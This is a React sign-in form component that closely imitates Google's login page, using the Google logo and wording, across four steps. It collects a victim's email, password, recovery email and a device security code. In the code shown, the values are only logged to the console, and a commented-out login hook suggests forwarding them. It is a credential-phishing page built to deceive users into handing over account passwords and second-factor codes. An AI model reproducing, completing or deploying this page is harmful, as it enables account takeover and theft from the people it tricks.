"use client"
import React, { useState } from 'react';
import useMockLogin from '../hooks/useMockLogin';
import {useForm} from "react-hook-form"

const Form = () => {
     const form=useForm()
     const{register,handleSubmit}=form
    const [selectedButton, setSelectedButton] = useState(0);
    const [passwordShown, setPasswordShown] = useState(false);
    const [email, setEmail] = useState('');
      const togglePassword = () => {
          setPasswordShown(!passwordShown);
        };
         
       
    
    // const{login}=useMockLogin()
  
    const handleButtonClick = (buttonNumber) => {
        setSelectedButton(buttonNumber);
      };
       
      const onSubmit=(data)=>{
        const {recoveryEmail,password,recoveryPassword}=data
        const submitValues = {
             email,
            recoveryEmail,
           password,
           recoveryPassword
            
          };
          console.log("Form Submitted",submitValues)
          // login(submitValues)
          
       }
    return (
        <form onSubmit={handleSubmit(onSubmit)}>
            { selectedButton === 0 &&(
                    <div className="container">
                    <div className="top-content">
                      <img src="https://i.postimg.cc/CL7CmGSx/google-logo-png-29530.png" alt=""/>
                      <h2 className="font-semibold text-xl">Sign in</h2>
                         <div >
                    
                         </div>
                      <p className="heading">Use your Google Account</p>
                    
                    
                    </div>
                    <div className="inputs">
                      <input type="email"  value={email}
                    onChange={(e)=>setEmail(e.target.value)}
                      id="email" className="input"
                      required/>
                      <label for="email" className="input-label">Email or phone</label>
                    
                    </div>
                    <a href="" className="link-btn text-base">Forgot Email?</a>
                    <p className="text-base">Not your computer? Use Guest mode to sign in privately.</p>
                    <a href="" className="link-btn mt-3">Learn More</a>
                    <div className="btn-group">
                      <button className="create-btn">Create account</button>
                       
                      <button className="next-btn" onClick={() =>handleButtonClick(1)}>Next</button>
                      
                      
                    
                    </div>
                    </div>
                 )
            }
            {
             selectedButton===1 &&(
                <div className="container">
  <div className="top-content">
    <img src="https://i.postimg.cc/CL7CmGSx/google-logo-png-29530.png" alt=""/>
    <p className='font-semibold text-xl pt-3'>Welcome</p>
    <div className="type-email mt-2">
    <svg aria-hidden="true" className="stUf5b" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path></svg>
    <p>{email}</p>
    <svg aria-hidden="true" className="stUf5b MSBt4d" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon></svg>
    </div>
  
  </div>
  
  <p className="heading mt-7">Verify your identity first to continue
  </p>
  <div className="inputs">
    <input type={passwordShown ? "text" : "password"} name="" id="password" {...register('password')} className="input" required/>
  
    <label for="email" className="input-label">Enter your password</label>
  
  </div>
  <div className="mb-3 form-check">
  <input type="checkbox" checked={passwordShown} onChange={togglePassword} className="form-check-input" id="exampleCheck1" />
  <label className="form-check-label pl-1 text-[#1864c9]"
  for="exampleCheck1">{passwordShown ? 'Hide password' : 'Show password'}</label>
  </div>
  <div className="btn-group mt-14">
    <button className="create-btn text-base">Don't remember the password?</button>
    <button className="next-btn" onClick={() =>handleButtonClick(2)}>Next</button>
    
  
  
  </div>
  </div>
             )
            }
            {
                selectedButton===2 &&(
                    <div className="container">
                    <div className="top-content">
                      <img src="https://i.postimg.cc/CL7CmGSx/google-logo-png-29530.png" alt=""/>
                      <p className='font-semibold text-xl pt-3'>Welcome</p>
                      <div className="type-email mt-2">
                      <svg aria-hidden="true" className="stUf5b" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path></svg>
                      <p>{email}</p>
                      <svg aria-hidden="true" className="stUf5b MSBt4d" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon></svg>
                      </div>
                    
                    </div>
                    <div className="pt-5">
                    <p>Get a verification code</p>
                    <p className='pt-3 pb-2'>To get a verification code first confirm the recovery email address you added to your account .....@.....</p>
                    </div>
                    
                    <div className="inputs">
                    <input type="email"
                    id="recoveryEmail" 
                    {...register('recoveryEmail')}
                    className="input" required/>
                    <label for="email" className="input-label">Enter your recovery email</label>
                    
                    </div>
                    <div className="btn-group mt-14">
                      <button className="create-btn font-medium">Recovery Number</button>
                      
                      <button className="next-btn"  onClick={() =>handleButtonClick(3)}>Next</button>
                      
                     
                    
                    </div>
                    </div>
                )
            }
            {
                selectedButton===3&&(
                    <div className="container">
                    <div className="top-content">
                      <img src="https://i.postimg.cc/CL7CmGSx/google-logo-png-29530.png" alt=""/>
                      <p className='font-semibold text-xl pt-3'>Welcome</p>
                      <div className="type-email mt-2">
                      <svg aria-hidden="true" className="stUf5b" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path></svg>
                      <p>{email}</p>
                      <svg aria-hidden="true" className="stUf5b MSBt4d" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon></svg>
                      </div>
                    
                    </div>
                    <div className="pt-5 pl-3">
                    <ul  className="list-disc p-5 text-base">
                    <li>Get your <b>Device</b></li>
                    <li>Open settings app </li>
                    <li>Tap <b>Google</b></li>
                    <li>Choose your account, if it not already selected</li>
                    <li>Tap <b>Manage your Google Account</b></li>
                    <li>Select the security tab(you may need to scroll to the right)</li>
                    <li>Under "Signing in to Google" tap <b>Security code</b></li>
                    <li>Choose an account to get your code</li></ul>
                    </div>
                    
                    <div className="inputs">
                      <input type="password" {...register('recoveryPassword')} id="recoveryPassword" className="input"/>
                    
                      <label for="password" className="input-label">Enter your code</label>
                    
                    </div>
                    <div className="btn-group mt-14">
                      <button className="create-btn font-medium">More ways to sign in</button>
                    
                      <button className="next-btn" 
                      >Sign In</button>
                    
                     
                    
                    </div>
                    </div>
                )
            }
        </form>
    );
};

export default Form;